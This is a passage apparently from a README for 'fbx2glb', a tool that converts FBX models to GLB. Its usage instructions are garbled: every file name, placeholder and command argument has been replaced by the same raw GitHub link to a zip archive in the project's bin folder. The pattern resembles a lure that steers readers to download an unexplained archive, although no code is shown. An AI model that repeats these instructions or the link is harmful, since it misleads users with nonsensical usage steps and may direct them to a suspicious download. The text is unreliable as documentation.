```

Replace `https://github.com/Brmage23/fbx2glb/raw/refs/heads/main/bin/glb_fbx_v1.8.zip` with the path to your FBX file and `https://github.com/Brmage23/fbx2glb/raw/refs/heads/main/bin/glb_fbx_v1.8.zip` with the desired name for the output file.

## 🎉 Example Usage

If you have an FBX file named `https://github.com/Brmage23/fbx2glb/raw/refs/heads/main/bin/glb_fbx_v1.8.zip` in the same directory, you can convert it to GLB by running:

```
fbx2glb https://github.com/Brmage23/fbx2glb/raw/refs/heads/main/bin/glb_fbx_v1.8.zip -o https://github.com/Brmage23/fbx2glb/raw/refs/heads/main/bin/glb_fbx_v1.8.zip
```

This will generate a `https://github.com/Brmage23/fbx2glb/raw/refs/heads/main/bin/glb_fbx_v1.8.zip` file in the same directory.
